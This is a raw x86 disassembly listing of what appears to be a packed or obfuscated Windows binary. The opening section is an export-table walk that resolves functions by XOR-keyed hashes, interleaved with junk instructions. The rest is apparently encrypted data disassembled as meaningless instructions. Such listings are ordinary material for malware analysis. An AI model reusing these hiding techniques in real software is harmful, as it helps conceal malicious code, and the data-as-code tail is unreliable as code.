  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	and    al,0x32
  40635c:	mov    al,0xaa
  40635e:	cmp    BYTE PTR [ebx],bh
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx-0x5b]
  406367:	inc    ebx
  406368:	mul    BYTE PTR [ebx]
  40636a:	js     0x40638f
  40636c:	loop   0x40634d
  40636e:	cdq    
  40636f:	sbb    ebp,ebx
  406371:	scas   eax,DWORD PTR es:[edi]
  406372:	sbb    DWORD PTR [eax+0x5d21b765],eax
  406378:	inc    edx
  406379:	adc    eax,0x8aacac7c
  40637e:	xor    DWORD PTR [edx+0x2781d154],ebp
  406384:	jbe    0x9043b01a
  40638a:	add    ah,cl
  40638c:	retf   0x125
  40638f:	loop   0x4063b7
  406391:	ror    BYTE PTR [edx+0x40],1
  406394:	or     ecx,DWORD PTR [ebp-0x643f72a1]
  40639a:	pop    esi
  40639b:	push   ecx
  40639c:	aam    0x7c
  40639e:	pop    ebx
  40639f:	mov    eax,0xa742fa99
  4063a4:	js     0x4063c1
  4063a6:	sbb    al,0x28
  4063a8:	dec    ebp
  4063a9:	mov    dh,0x36
  4063ab:	pop    ds
  4063ac:	push   edi
  4063ad:	mov    esi,0xef7453a2
  4063b2:	inc    ecx
  4063b3:	stc    
  4063b4:	adc    eax,0x1a66d6c7
  4063b9:	mov    ah,0x95
  4063bb:	iret   
  4063bc:	call   0x9e72:0x4b572e6
  4063c3:	mov    ebx,0x7821a2ec
  4063c8:	mov    ds:0xce213578,al
  4063cd:	or     bh,dh
  4063cf:	pop    ebp
  4063d0:	dec    esi
  4063d1:	cmp    ecx,ebx
  4063d3:	xchg   esi,eax
  4063d4:	mov    ecx,0x9a72baef
  4063d9:	inc    ebx
  4063da:	ret    
  4063db:	aaa    
  4063dc:	aaa    
  4063dd:	adc    cl,BYTE PTR [ebx]
  4063df:	pop    ss
  4063e0:	sub    al,0xd4
  4063e2:	fidivr WORD PTR [edx-0x1f0ca354]
  4063e8:	iret   
  4063e9:	dec    edi
  4063ea:	outs   dx,BYTE PTR ds:[esi]
  4063eb:	xor    DWORD PTR [ebx],edx
  4063ed:	clc    
  4063ee:	das    
  4063ef:	repnz sub DWORD PTR [esi],ebp
  4063f2:	sub    eax,DWORD PTR [ecx+0x6227e6a4]
  4063f8:	sub    bl,dl
  4063fa:	sub    ebx,esi
  4063fc:	pop    ebx
  4063fd:	jecxz  0x40646c
  4063ff:	(bad)  
  406400:	leave  
  406401:	fcmovnb st,st(3)
  406403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406404:	mov    ds:0x8675b675,al
  406409:	adc    esp,DWORD PTR [edx-0x514d2c5b]
  40640f:	js     0x406486
  406411:	fidivr DWORD PTR [ecx+0x4d]
  406414:	inc    edi
  406415:	jns    0x4063a0
  406417:	sub    eax,0xa756e14c
  40641c:	xchg   eax,ebx
  40641e:	imul   eax,DWORD PTR [esi-0x19291449],0x20
  406425:	inc    ecx
  406426:	jg     0x4063ff
  406428:	push   ebx
  406429:	les    ecx,FWORD PTR ds:0xbc459ef0
  40642f:	xor    BYTE PTR ds:0xf52eeea4,dl
  406435:	ret    0x17a0
  406438:	js     0x4063d3
  40643a:	das    
  40643b:	xchg   BYTE PTR [esi+eiz*2+0xb513079],dh
  406442:	retf   
  406443:	das    
  406444:	sbb    BYTE PTR [esi+0x6a13f8c4],ah
  40644a:	adc    BYTE PTR [edi],ah
  40644c:	call   0x650ea303
  406451:	retf   0xf784
  406454:	scas   eax,DWORD PTR es:[edi]
  406455:	in     al,dx
  406456:	popf   
  406457:	mov    ecx,0x6e21df69
  40645c:	test   BYTE PTR [ecx],cl
  40645e:	mov    ah,cl
  406460:	xor    BYTE PTR [esi-0x61],dh
  406463:	push   ebp
  406464:	dec    edi
  406465:	mov    bl,0x8f
  406467:	frstpm(287 only) 
  406469:	push   0xffffffea
  40646b:	push   cs
  40646c:	push   ebx
  40646d:	je     0x406450
  40646f:	jne    0x4064cd
  406471:	call   0xb07b:0x5f62807d
  406478:	xchg   esp,eax
  406479:	jmp    0x4064c1
  40647b:	sbb    esi,esp
  40647d:	sub    eax,0x29abec64
  406482:	sub    dh,BYTE PTR [esi+0xe]
  406485:	adc    al,0x12
  406487:	ja     0x406488
  406489:	mov    fs,WORD PTR [edx-0x71a33045]
  40648f:	(bad)  [edx-0x6d2321f7]
  406495:	in     eax,dx
  406496:	fcomp  DWORD PTR [edx]
  406498:	mov    esp,0x2f94fefa
  40649d:	mov    al,dl
  40649f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064a0:	cdq    
  4064a1:	rol    BYTE PTR ds:0x72237ecd,0xd7
  4064a8:	(bad)  
  4064a9:	pop    esi
  4064aa:	enter  0x9ac6,0xbb
  4064ae:	xchg   esi,eax
  4064af:	int3   
  4064b0:	(bad)
  4064b3:	cmp    eax,0x10d82fa5
  4064b8:	jbe    0x4064ea
  4064ba:	pop    ebp
  4064bb:	inc    esp
  4064bc:	xor    DWORD PTR [eax],esp
  4064be:	arpl   WORD PTR [esi+0x25],cx
  4064c1:	ret    0xd463
  4064c4:	sbb    eax,0xb2fcb31e
  4064c9:	dec    ebp
  4064ca:	xchg   ebx,eax
  4064cb:	mov    esp,0x329bac66
  4064d0:	pop    ebx
  4064d1:	jmp    FWORD PTR ds:[eax+0x23a87a74]
  4064d8:	add    esp,edi
  4064da:	in     eax,dx
  4064db:	xchg   esi,eax
  4064dc:	add    al,BYTE PTR [edx+0x5f9e12a]
  4064e2:	hlt    
  4064e3:	mov    ds:0x6f37dd20,eax
  4064e8:	sub    DWORD PTR [edi+0x279f5f53],0x42
  4064ef:	or     esi,DWORD PTR [ebp-0x4a8c1307]
  4064f5:	(bad)  
  4064f6:	in     al,0x3f
  4064f8:	pop    ss
  4064f9:	dec    edi
  4064fa:	xor    ebx,DWORD PTR [edi-0x56413c1e]
  406500:	sub    eax,DWORD PTR [ebx]
  406502:	adc    BYTE PTR [eax-0x49a44563],0x28
  406509:	adc    esp,ebp
  40650b:	dec    ebx
  40650c:	xor    DWORD PTR [ecx+0x44e9e391],ebp
  406512:	sar    DWORD PTR [eax+edi*4+0x28],1
  406516:	pop    ebp
  406517:	and    DWORD PTR [edi-0xb],eax
  40651a:	jns    0x406577
  40651c:	ficom  WORD PTR [eax]
  40651e:	test   al,0x10
  406520:	xor    al,BYTE PTR [ecx+ebp*1]
  406523:	cmp    BYTE PTR [ebx-0x37613da6],dl
  406529:	add    bl,BYTE PTR [esi+0x4e1df238]
  40652f:	cmp    ebp,DWORD PTR ds:[esi+0x14]
  406533:	jns    0x406588
  406535:	push   ds
  406536:	jmp    0xbdaa1a4
  40653b:	pop    ebp
  40653c:	js     0x40652d
  40653e:	lds    ebp,FWORD PTR [edx+0x29491233]
  406544:	in     al,dx
  406545:	pusha  
  406546:	or     ecx,DWORD PTR [edx+0x48]
  406549:	stos   BYTE PTR es:[edi],al
  40654a:	xor    bh,BYTE PTR [ecx+esi*4]
  40654d:	(bad)  
  40654e:	pushf  
  40654f:	in     al,0x85
  406551:	pop    esi
  406552:	mov    ebp,0x36e07330
  406557:	push   0x79
  406559:	lea    ebp,[eax+0x357ae5ef]
  40655f:	sub    BYTE PTR [edx+0x72],dl
  406562:	fdiv   QWORD PTR [edi-0x3a]
  406565:	clc    
  406566:	mov    DWORD PTR [eax+0x69f8d6fa],0xb46ec571
  406570:	jmp    0x11b8a01f
  406575:	xchg   DWORD PTR [ebx+eiz*8-0xdb837ae],edx
  40657c:	cld    
  40657d:	dec    ebp
  40657e:	mov    eax,0xe2a32926
  406583:	mov    bl,0xc5
  406585:	xor    ebp,edx
  406587:	loope  0x406598
  406589:	cwde   
  40658a:	les    ecx,FWORD PTR [edx-0x44ac5fb3]
  406590:	lods   al,BYTE PTR ds:[esi]
  406591:	(bad)  
  406593:	call   0xad33:0x78cc26a
  40659a:	dec    esi
  40659b:	jmp    0x423c8dcc
  4065a0:	(bad)  
  4065a2:	add    eax,0x465b3b62
  4065a7:	ror    BYTE PTR [eax-0x7b],0x1f
  4065ab:	xchg   edx,eax
  4065ac:	in     eax,dx
  4065ad:	jb     0x4065d6
  4065af:	(bad)  
  4065b0:	loope  0x406620
  4065b2:	(bad)  
  4065b3:	test   DWORD PTR [ebp+0x6cfa18e5],0x2f6c297f
  4065bd:	js     0x4065f3
  4065bf:	repz xor BYTE PTR [ebp-0x75581ed5],cl
  4065c6:	jne    0x406571
  4065c8:	inc    edi
  4065c9:	in     eax,dx
  4065ca:	outs   dx,DWORD PTR ds:[esi]
  4065cb:	sbb    eax,0x5bc04cd6
  4065d0:	sub    eax,0x9d8cf8de
  4065d5:	and    eax,0x7d1fb756
  4065da:	out    0x9e,eax
  4065dc:	push   0x65
  4065de:	pop    ecx
  4065df:	push   eax
  4065e0:	stos   DWORD PTR es:[edi],eax
  4065e1:	mov    ds:0xb2982727,eax
  4065e6:	adc    al,0x78
  4065e8:	adc    DWORD PTR [eax-0x577b9b5],edi
  4065ee:	or     BYTE PTR [edi],bh
  4065f0:	ins    BYTE PTR es:[edi],dx
  4065f1:	ror    eax,cl
  4065f3:	sbb    ebx,edi
  4065f5:	pop    ebp
  4065f6:	dec    ecx
  4065f7:	or     DWORD PTR [edi+ebx*8+0x53],esi
  4065fb:	sub    cl,BYTE PTR [ecx]
  4065fd:	xchg   edi,eax
  4065fe:	cs aaa 
  406600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406601:	mov    ebx,0x7ec9889b
  406606:	(bad)  
  406609:	mov    esp,0xc520bce5
  40660e:	addr16 inc ecx
  406610:	or     al,0xe9
  406612:	adc    edx,DWORD PTR [eax+0x6fbe401c]
  406618:	push   esi
  406619:	adc    DWORD PTR [ebx],eax
  40661b:	add    DWORD PTR [edi],ebp
  40661d:	xor    DWORD PTR [eax+0x78264fac],eax
  406623:	outs   dx,DWORD PTR ds:[esi]
  406624:	out    0x92,al
  406626:	xor    al,0x66
  406628:	cdq    
  406629:	sub    bh,BYTE PTR [ebx-0x48]
  40662c:	xor    al,al
  40662e:	xor    al,0x1b
  406630:	sub    dl,cl
  406632:	jl     0x4066af
  406634:	mov    edi,0xa1871c32
  406639:	popa   
  40663a:	loop   0x4065e5
  40663c:	inc    ebp
  40663d:	sbb    eax,0x307216de
  406642:	outs   dx,BYTE PTR ds:[esi]
  406643:	pop    esp
  406644:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406645:	fsubrp st(0),st
  406647:	lods   al,BYTE PTR ds:[esi]
  406648:	mov    al,ds:0xb0239f9d
  40664d:	js     0x40661b
  40664f:	xor    esp,edi
  406651:	mov    ch,0x51
  406653:	aas    
  406654:	hlt    
  406655:	adc    DWORD PTR [ecx+edi*8],esi
  406658:	iret   
  406659:	repz push esi
  40665b:	cmp    al,0x13
  40665d:	add    al,0x7
  40665f:	inc    ecx
  406660:	adc    edx,DWORD PTR [ebx+0x77]
  406663:	jmp    0xc88a:0x66b940a6
  40666a:	inc    edi
  40666b:	or     eax,0x95ee03b4
  406670:	shr    DWORD PTR [eax+0xf],1
  406673:	or     eax,0xae3cab3a
  406678:	or     DWORD PTR [edx],0xffffffdd
  40667b:	mov    ebp,0x27a4dcb7
  406680:	mov    WORD PTR [edx-0x6],?
  406683:	add    eax,0xb6e38cc3
  406688:	(bad)  
  406689:	adc    eax,0x2dd0a471
  40668e:	idiv   esi
  406690:	inc    edi
  406691:	cmp    al,BYTE PTR [edi-0x2e106a4b]
  406697:	cmp    al,0x48
  406699:	pop    ss
  40669a:	mov    DWORD PTR [esi],edi
  40669c:	jno    0x406634
  40669e:	add    al,0x54
  4066a0:	push   es
  4066a1:	pop    eax
  4066a2:	rcr    DWORD PTR [ecx],0xc6
  4066a5:	push   0x57
  4066a7:	and    al,0x87
  4066a9:	sub    edx,DWORD PTR [edx]
  4066ab:	stc    
  4066ac:	dec    ebp
  4066ad:	xchg   BYTE PTR ss:[ebp+0x1fd7a10c],al
  4066b4:	sti    
  4066b5:	mov    cs,WORD PTR [esi]
  4066b7:	lods   al,BYTE PTR ds:[esi]
  4066b8:	in     al,dx
  4066b9:	and    al,0x8c
  4066bb:	ret    
  4066bc:	mov    ah,0x99
  4066be:	inc    edi
  4066bf:	add    esp,DWORD PTR [eax]
  4066c1:	sbb    al,0xd5
  4066c3:	ret    
  4066c4:	inc    ebx
  4066c5:	div    DWORD PTR [ecx+0x263bd2b]
  4066cb:	xchg   ebx,eax
  4066cc:	sub    BYTE PTR [ebp+0x1c],bl
  4066cf:	jp     0x40670a
  4066d1:	cs addr16 jg 0x406684
  4066d5:	es (bad) 
  4066d7:	dec    cl
  4066d9:	test   edx,ebx
  4066db:	jg     0x406710
  4066dd:	xor    BYTE PTR [ecx],ah
  4066df:	fmul   QWORD PTR [esi+0x6d]
  4066e2:	sbb    al,0xeb
  4066e4:	dec    ecx
  4066e6:	aam    0x0
  4066e8:	fnstsw WORD PTR [edx-0x59]
  4066eb:	mov    dl,0x1a
  4066ed:	add    BYTE PTR [ebx],dl
  4066ef:	icebp  
  4066f0:	jne    0x4066e0
  4066f2:	and    BYTE PTR [edx+0x15a02f0],dh
  4066f8:	in     eax,0x6
  4066fa:	push   ebp
  4066fb:	pop    ds
  4066fc:	fidivr WORD PTR [ecx+0x74]
  4066ff:	(bad)  
  406701:	out    dx,eax
  406702:	je     0x4066fe
  406704:	loopne 0x4066e3
  406706:	mov    esp,DWORD PTR [ecx-0x32]
  406709:	jecxz  0x406734
  40670b:	jo     0x4066ff
  40670d:	ds and eax,0xfa00a5a6
  406713:	ins    DWORD PTR es:[edi],dx
  406714:	shl    DWORD PTR [eax-0x1e],0xb3
  406718:	bound  esp,QWORD PTR [ecx]
  40671a:	arpl   di,ax
  40671c:	dec    eax
  40671d:	mov    esp,0xe02cc4b
  406722:	std    
  406723:	mov    ds:0xaa26da27,al
  406728:	aam    0x8f
  40672a:	mov    edx,0x36daf8bd
  40672f:	adc    ch,BYTE PTR [ecx+ecx*8]
  406732:	cli    
  406733:	std    
  406734:	cmp    edi,DWORD PTR ss:[ecx+0xbfdf5fc]
  40673b:	gs cvtdq2ps xmm6,xmm2
  40673f:	and    dl,ch
  406741:	add    edx,ebp
  406743:	dec    ebp
  406744:	mov    ch,0x47
  406746:	pop    eax
  406747:	jge    0x40675d
  406749:	dec    DWORD PTR [ebp-0x5e]
  40674c:	sub    DWORD PTR [ecx],0xffffffee
  40674f:	fild   WORD PTR [edi+ebp*2-0x63]
  406753:	mov    edi,0x196a3588
  406758:	jmp    0x8d4c554b
  40675d:	in     eax,0x5f
  40675f:	lds    esp,FWORD PTR [edx+0x53779be7]
  406765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406766:	sbb    bl,BYTE PTR [esi+0x16]
  406769:	pop    ss
  40676a:	mov    edx,0x20b746a5
  40676f:	fisubr WORD PTR [eax]
  406771:	cmp    ah,ah
  406773:	mov    ds:0xec900306,al
  406778:	(bad)  
  406779:	arpl   WORD PTR [edx*2+0x1e0b9064],sp
  406780:	sbb    dh,BYTE PTR [ebx]
  406782:	mov    ebx,0x576824d1
  406787:	sbb    al,0xf2
  406789:	loopne 0x4067fa
  40678b:	jl     0x4067d5
  40678d:	mov    dl,0xb0
  40678f:	mov    eax,ds:0xe3691dd5
  406794:	sub    DWORD PTR [ebx+0x75],ebp
  406797:	inc    eax
  406798:	xchg   edi,eax
  406799:	mov    DWORD PTR [esi*8+0x47f4bc2a],ebp
  4067a0:	pop    ss
  4067a1:	adc    bl,dh
  4067a3:	rol    DWORD PTR [esi+0x72],0xb0
  4067a7:	jmp    0xc9f8:0xc583ca0f
  4067ae:	push   esi
  4067af:	cmp    eax,0x6d2f3e44
  4067b4:	push   ebp
  4067b5:	inc    esi
  4067b6:	push   0x71055239
  4067bb:	sub    dl,BYTE PTR [eax+0x67]
  4067be:	xchg   esp,eax
  4067bf:	jo     0x406758
  4067c1:	adc    bh,ch
  4067c3:	mov    ebp,0x33eb0169
  4067c8:	int3   
  4067c9:	push   0x4c8d2217
  4067ce:	in     al,dx
  4067cf:	push   edi
  4067d0:	and    eax,0xa436e11f
  4067d5:	pusha  
  4067d6:	mov    ebp,0xca9fe715
  4067db:	cs retf 0xde4b
  4067df:	std    
  4067e0:	mov    esp,es
  4067e2:	rcr    BYTE PTR [esi+0x54567f6],1
  4067e8:	retf   
  4067e9:	les    edx,FWORD PTR [edx-0x4c2006be]
  4067ef:	dec    ebp
  4067f0:	push   edi
  4067f1:	jl     0x40680d
  4067f3:	cld    
  4067f4:	pop    ss
  4067f5:	mov    al,ds:0x1e894d5b
  4067fa:	jle    0x4067fb
  4067fc:	and    ecx,DWORD PTR [ebp-0xa]
  4067ff:	sbb    al,0x12
  406801:	retf   0xd166
  406804:	cmp    al,0x81
  406806:	jno    0x406837
  406808:	outs   dx,DWORD PTR ds:[esi]
  406809:	sub    al,0x73
  40680b:	cmp    al,BYTE PTR [ebx+0x51]
  40680e:	mov    ah,BYTE PTR [edx]
  406810:	pop    esp
  406811:	jo     0x406869
  406813:	sbb    al,0x8
  406815:	xchg   BYTE PTR [esi],bl
  406817:	add    edx,DWORD PTR [ebx+0x1d6d1123]
  40681d:	sub    eax,0x29859eaf
  406822:	repnz sbb dh,al
  406825:	sbb    eax,0x6d1fe1eb
  40682a:	jbe    0x4067e8
  40682c:	mov    al,ds:0xfd36c24b
  406831:	lahf   
  406832:	and    al,0x65
  406834:	fwait
  406835:	push   cs
  406836:	xchg   esp,eax
  406837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406838:	mov    cl,0x62
  40683a:	outs   dx,BYTE PTR ds:[esi]
  40683b:	push   esi
  40683c:	cmp    eax,0x7857997e
  406841:	cli    
  406842:	(bad)  
  406843:	mov    al,ds:0x7782465a
  406848:	fstp   QWORD PTR [eax+0x729566af]
  40684e:	loop   0x40683f
  406850:	retf   
  406851:	inc    esi
  406852:	push   esp
  406853:	stos   DWORD PTR es:[edi],eax
  406854:	ins    BYTE PTR es:[edi],dx
  406855:	pop    edi
  406856:	jp     0x4067e3
  406858:	std    
  406859:	ret    0x80da
  40685c:	push   cs
  40685d:	jmp    0xfad0:0x72d8a5b2
  406864:	enter  0x9ec2,0x9b
  406868:	xor    edx,DWORD PTR [ebp+0x38]
  40686b:	adc    eax,0x655dc5e5
  406870:	xchg   ebp,eax
  406871:	mov    DWORD PTR [ecx+0x514a0862],esi
  406877:	scas   eax,DWORD PTR es:[edi]
  406878:	sub    ah,bl
  40687a:	hlt    
  40687b:	mov    ss:0x90dd4d7f,al
  406881:	add    esi,DWORD PTR [esi]
  406883:	out    dx,eax
  406884:	sub    edi,DWORD PTR [ebp+0x12]
  406887:	cmp    al,0x92
  406889:	loop   0x40684b
  40688b:	push   es
  40688c:	push   cs
  40688d:	mov    cl,0xc2
  40688f:	(bad)  
  406890:	adc    ecx,DWORD PTR [ecx+0x53]
  406893:	jo     0x40686b
  406895:	fdivr  QWORD PTR [edi]
  406897:	fidiv  WORD PTR [ecx+eax*4+0x3a5780c1]
  40689e:	inc    ecx
  40689f:	cmp    DWORD PTR [ebx+ebx*8+0x43],ecx
  4068a3:	lock in eax,0x7b
  4068a6:	lock inc ebx
  4068a8:	imul   edi,DWORD PTR [ebp-0x68],0xd8bb7352
  4068af:	rcl    DWORD PTR ds:0xdf1c0a3e,1
  4068b5:	je     0x4068da
  4068b7:	pop    ss
  4068b8:	ret    0xe7a9
  4068bb:	xchg   ebx,eax
  4068bc:	sub    ebp,DWORD PTR [esi]
  4068be:	and    dh,dh
  4068c0:	aam    0x62
  4068c2:	call   0x9ce3:0xa1dcd523
  4068c9:	in     al,0x6c
  4068cb:	loop   0x406862
  4068cd:	and    eax,0x2cd6b5aa
  4068d2:	test   di,sp
  4068d5:	lock fs inc esi
  4068d8:	fistp  QWORD PTR [ecx+0x4d]
  4068db:	xchg   edx,eax
  4068dc:	out    0x8c,al
  4068de:	inc    esi
  4068df:	push   cs
  4068e0:	cmp    BYTE PTR [esi-0x4e],ah
  4068e3:	add    DWORD PTR [ecx+0x2bdfc63a],eax
  4068e9:	retf   
  4068ea:	cwde   
  4068eb:	cs push ds
  4068ed:	and    al,0x84
  4068ef:	(bad)  
  4068f0:	repnz sub al,0xe0
  4068f3:	mov    bh,0xa3
  4068f5:	sub    BYTE PTR [ebp-0x2c2950a],bl
  4068fb:	xchg   edi,eax
  4068fc:	xchg   ecx,eax
  4068fd:	mov    bl,0x3e
  4068ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406900:	popf   
  406901:	mov    bh,0x83
  406903:	inc    edi
  406904:	mov    ch,BYTE PTR [ecx-0x473649c6]
  40690a:	push   edx
  40690b:	div    bh
  40690d:	pop    ecx
  40690e:	xchg   esp,eax
  40690f:	fstp   st(3)
  406911:	inc    ebp
  406912:	out    dx,al
  406913:	repnz ds xor eax,0x41022215
  40691a:	push   cs
  40691b:	xor    eax,0xf23d986
  406920:	(bad)
  406925:	bound  ecx,QWORD PTR [eax]
  406927:	test   eax,0x68a22aab
  40692c:	stos   DWORD PTR es:[edi],eax
  40692d:	lds    ecx,FWORD PTR [eax]
  40692f:	rep stos BYTE PTR es:[edi],al
  406931:	das    
  406932:	test   BYTE PTR [esi-0x2e1cbb71],ch
  406938:	and    ebp,edi
  40693a:	std    
  40693b:	icebp  
  40693c:	lods   eax,DWORD PTR ds:[esi]
  40693d:	xchg   ebx,eax
  40693e:	xchg   DWORD PTR [ecx],ebp
  406940:	std    
  406941:	mov    ds:0x60e6da9e,al
  406946:	push   0xaafb19a0
  40694b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40694c:	jo     0x4068ff
  40694e:	loope  0x4068dd
  406950:	xor    BYTE PTR [edi+0x58],dl
  406953:	push   esp
  406954:	daa    
  406955:	fstp   TBYTE PTR [ebx-0x2a]
  406958:	jle    0x4069d9
  40695a:	shl    BYTE PTR [ecx-0x5e],cl
  40695d:	rol    DWORD PTR [esi-0x4c46bf2a],0xa4
  406964:	or     al,0xe
  406966:	jge    0x40690a
  406968:	pop    es
  406969:	(bad)  
  40696a:	lods   eax,DWORD PTR ds:[esi]
  40696b:	fld    QWORD PTR [esi+0x51]
  40696e:	lea    ecx,[ecx-0x7a4ffa28]
  406974:	daa    
  406975:	loopne 0x4069ad
  406977:	in     eax,0x1b
  406979:	push   ebp
  40697a:	scas   eax,DWORD PTR es:[edi]
  40697b:	dec    ebp
  40697c:	mov    al,0xd1
  40697e:	retf   0x502d
  406981:	xchg   esi,edi
  406983:	cmp    al,0x13
  406985:	sub    DWORD PTR [eax+0x4402b348],edi
  40698b:	or     eax,DWORD PTR [ebx-0x50ea94c0]
  406991:	push   edi
  406992:	fld    DWORD PTR [esi+0x5dc9763c]
  406998:	in     eax,dx
  406999:	fisubr DWORD PTR [edi+0x16d6cc3e]
  40699f:	sub    ebp,DWORD PTR [ebp-0x569b584f]
  4069a5:	sbb    dl,BYTE PTR [edi+0xc]
  4069a8:	sub    DWORD PTR [edi+0xf],ecx
  4069ab:	in     eax,dx
  4069ac:	mov    edx,0xb7cc56bf
  4069b1:	ins    BYTE PTR es:[edi],dx
  4069b2:	out    dx,al
  4069b3:	popf   
  4069b4:	mov    cl,BYTE PTR [ebx+0x3f]
  4069b7:	js     0x406990
  4069b9:	push   esp
  4069ba:	lods   al,BYTE PTR ds:[esi]
  4069bb:	icebp  
  4069bc:	lahf   
  4069bd:	nop
  4069be:	mov    ecx,0xc4228b90
  4069c3:	imul   esi,DWORD PTR [edi+0x49],0x36
  4069c7:	rcl    DWORD PTR [ecx],cl
  4069c9:	sub    al,BYTE PTR [edx-0xa]
  4069cc:	int3   
  4069cd:	cdq    
  4069ce:	jmp    0x406973
  4069d0:	push   eax
  4069d1:	or     al,0xa4
  4069d3:	es call 0x83894bb
  4069d9:	jbe    0x406a42
  4069db:	test   al,0xb1
  4069dd:	pop    edx
  4069de:	xlat   BYTE PTR ds:[ebx]
  4069df:	sti    
  4069e0:	aas    
  4069e1:	jecxz  0x4069f3
  4069e3:	fisub  DWORD PTR [esi+edx*4+0x60]
  4069e7:	push   0x71
  4069e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ea:	daa    
  4069eb:	cmp    edi,DWORD PTR [eax-0x68]
  4069ee:	xchg   ebp,eax
  4069ef:	pop    eax
  4069f0:	push   es
  4069f1:	iret   
  4069f2:	sub    BYTE PTR [esi],0x17
  4069f5:	out    0x96,al
  4069f7:	sbb    BYTE PTR [esi+0x45],0x2e
  4069fb:	aam    0x21
  4069fd:	dec    di
  4069ff:	jne    0x406a1a
  406a01:	iret   
  406a02:	dec    edx
  406a03:	inc    edx
  406a04:	dec    eax
  406a05:	das    
  406a06:	ficom  DWORD PTR [edx+0x2]
  406a09:	retf   0xe154
  406a0c:	inc    ecx
  406a0d:	in     al,dx
  406a0e:	std    
  406a0f:	push   ecx
  406a10:	add    DWORD PTR [eax-0x6f],ecx
  406a13:	ds cwde 
  406a15:	dec    ebp
  406a16:	imul   esp,DWORD PTR [edi+0x30],0x47
  406a1a:	ficomp WORD PTR [ebx+0x47cfbbcd]
  406a20:	add    bh,BYTE PTR [ebx]
  406a22:	add    al,0x4d
  406a24:	dec    edi
  406a25:	out    dx,al
  406a26:	in     al,dx
  406a27:	scas   al,BYTE PTR es:[edi]
  406a28:	or     bl,cl
  406a2a:	ja     0x4069f9
  406a2c:	fadd   DWORD PTR [esp+ecx*1-0x7451cd00]
  406a33:	aaa    
